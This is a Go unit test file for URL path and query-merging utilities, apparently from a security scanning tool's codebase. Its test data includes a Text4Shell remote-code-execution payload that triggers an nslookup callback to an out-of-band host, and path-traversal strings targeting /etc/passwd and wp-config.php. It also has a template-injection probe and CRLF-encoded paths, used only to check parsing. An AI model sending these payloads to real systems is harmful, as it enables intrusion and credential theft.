package urlutil

import (
	"path"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestSimplePaths(t *testing.T) {
	// Merge Examples (Same as path.Join)
	// /blog   /admin => /blog/admin
	// /blog/test /wp-content  => /blog/wp/wp-content
	// /blog/admin /blog/admin/profile => /blog/admin/profile
	// /blog /blog/ => /blog/
	testcase1 := []struct {
		Path1 string
		Path2 string
	}{
		{"/blog", "/admin"},
		{"/", "/"},
		{"", "/admin"},
		{"/blog/test", "/wp-content"},
		{"/blog/test/", "/blog"},
		{"/blog/test/profile", "/blog"},
		{"/blog/test/", "/blog/test/profile"},
		{"/blog/", "/blog"},
	}

	for _, v := range testcase1 {
		pathtest := path.Join(v.Path1, v.Path2)
		mergetest := mergePaths(v.Path1, v.Path2)
		require.Equalf(t, pathtest, mergetest, "merge failure expected %v but got %v", pathtest, mergetest)
	}
}

func TestMergeUnsafePaths(t *testing.T) {
	//	Merge Examples with payloads and unsafe characters
	testcase2 := []struct {
		url      string // can also be a relative path
		Path2    string
		Expected string //Path
	}{
		{"/admin", "/%20test%0a", "/admin/%20test%0a"},
		{"scanme.sh", "%20test%0a", "/%20test%0a"},
		{"https://scanme.sh", "/%20test%0a", "/%20test%0a"},
		{"/?admin=true", "/path?yes=true", "/path?admin=true&yes=true"},
		{"scanme.sh", "../../../etc/passwd", "/../../../etc/passwd"},
		{"//scanme.sh", "/..%252F..%252F..%252F..%252F..%252F", "/..%252F..%252F..%252F..%252F..%252F"},
		{"/?user=true", "/profile", "/profile?user=true"},
	}

	for _, v := range testcase2 {
		rurl, err := ParseURL(v.url, false)
		require.Nil(t, err)
		err = rurl.MergePath(v.Path2, true)
		require.Nil(t, err)
		require.Equalf(t, v.Expected, rurl.GetRelativePath(), "expected %v but got %v", v.Expected, rurl.GetRelativePath())
	}
}

func TestMergeWithParams(t *testing.T) {
	testcase := []struct {
		url      string // can also be a relative path
		Path2    string
		Expected string //Full URL
	}{
		{"/", "/path/scan?param=yes", "/path/scan?param=yes"},
		{"/admin/?param=path", "profile?show=true", "/admin/profile?param=path&show=true"},
		{"/?admin=true", "/%20test%0a", "/%20test%0a?admin=true"},
		{"https://scanme.sh?admin=true", "/%20test%0a", "https://scanme.sh/%20test%0a?admin=true"},
		{"scanme.sh?admin=true", "/%20test%0a", "scanme.sh/%20test%0a?admin=true"},
		{"http://scanme.sh/?admin=true", "/%20test%0a", "http://scanme.sh/%20test%0a?admin=true"},
		{"https://scanme.sh?admin=true", "/%20test%0a", "https://scanme.sh/%20test%0a?admin=true"},
		{"scanme.sh", "/path", "scanme.sh/path"},
		{"scanme.sh?wp=false", "/path?yes=true&admin=false", "scanme.sh/path?admin=false&wp=false&yes=true"},
		{"https://scanme.sh", "?user=true&pass=yes", "https://scanme.sh?pass=yes&user=true"},
		{"scanme.sh", "favicon.ico", "scanme.sh/favicon.ico"},
	}
	for _, v := range testcase {
		rurl, err := ParseURL(v.url, false)
		require.Nil(t, err)
		err = rurl.MergePath(v.Path2, true)
		require.Nil(t, err)
		require.Equalf(t, v.Expected, rurl.String(), "expected %v but got %v", v.Expected, rurl.String())
	}
}

func TestAutoMergePaths(t *testing.T) {
	testcase := []struct {
		path1    string // can also be a relative path
		Path2    string
		Expected string //Full URL
	}{
		{"/", "/path/scan?param=yes", "/path/scan?param=yes"},
		{"/admin/?param=path", "profile?show=true", "/admin/profile?param=path&show=true"},
		{"/?admin=true", "/%20test%0a", "/%20test%0a?admin=true"},
		{"?admin=true", "?param=true", "?admin=true&param=true"}, // should allow empty paths
	}

	for _, v := range testcase {
		got, err := AutoMergeRelPaths(v.path1, v.Path2)
		require.Nilf(t, err, "failed to merge paths")
		require.Equal(t, got, v.Expected, "expected %v but got %v", v.Expected, got)
	}
}

func TestParameterParsing(t *testing.T) {
	testcases := []struct {
		URL           string
		ExpectedQuery string
	}{
		{"/text4shell/attack?search=$%7bscript:javascript:java.lang.Runtime.getRuntime().exec('nslookup%20{{Host}}.{{Port}}.getparam.{{interactsh-url}}')%7d", "search=$%7bscript:javascript:java.lang.Runtime.getRuntime().exec('nslookup%20{{Host}}.{{Port}}.getparam.{{interactsh-url}}')%7d"},
		{"/filedownload.php?ebookdownloadurl=../../../wp-config.php", "ebookdownloadurl=../../../wp-config.php"},
		{"/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test", "client_id=acme&redirect_uri=http://test&response_type=${13337*73331}&scope=openid"},
	}
	for _, v := range testcases {
		rurl, err := ParseURL(v.URL, false)
		require.Nil(t, err)
		require.Equalf(t, v.ExpectedQuery, rurl.Params.Encode(), "expected: %v\ngot: %v\n", v.ExpectedQuery, rurl.Params.Encode())
	}
}
